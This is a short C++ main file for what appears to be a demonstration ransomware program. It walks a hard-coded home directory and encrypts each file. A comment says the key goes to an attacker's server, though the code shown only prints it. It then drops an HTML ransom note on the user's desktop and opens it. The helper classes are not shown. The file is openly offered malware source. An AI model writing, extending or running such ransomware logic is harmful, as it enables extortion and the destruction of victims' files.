#include <iostream>
#include <vector>
#include <string>

#include "file_encryptor.h"
#include "dropper.h"

using std::cout;
using std::endl;
using std::vector;
using std::string;

int main(int argc, char* args[]) {
  // Encrypt user files.
  FileEncryptor encryptor;
  for (const auto& file : encryptor.ListDirectory("/home/aesophor/Temp")) {
    encryptor.Encrypt(file);
  }

  // Export the encryption key to attacker's server.
  cout << "Totally encrypted: " << encryptor.count() << " files." << endl;
  cout << encryptor.Export() << endl;

  // Drop HTML/css/logo on user's desktop directory.
  Dropper dropper("/home/aesophor/Desktop");
  dropper.DropNote(encryptor.count());
  system("xdg-open /home/aesophor/Desktop/index.html");

  return EXIT_SUCCESS;
}
